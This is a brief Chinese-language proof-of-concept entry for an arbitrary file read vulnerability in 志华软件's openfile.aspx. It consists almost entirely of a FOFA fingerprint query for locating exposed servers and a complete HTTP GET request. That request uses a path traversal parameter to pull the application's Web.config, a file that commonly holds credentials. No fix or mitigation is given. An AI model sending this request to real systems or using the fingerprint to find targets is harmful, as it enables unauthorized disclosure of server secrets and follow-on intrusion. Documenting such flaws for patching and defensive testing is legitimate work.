# 志华软件openfile.aspx存在任意文件读取漏洞

志华软件openfile.aspx存在任意文件读取漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。

## fofa

```javascript
body="b28web/Utility/"
```

## poc

```javascript
GET /oa/isprit/module/openfile.aspx?Url=..\..\..\Web.config HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Cookie: ASP.NET_SessionId=vu5fjewt125x2erxrujcfj4p
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
```

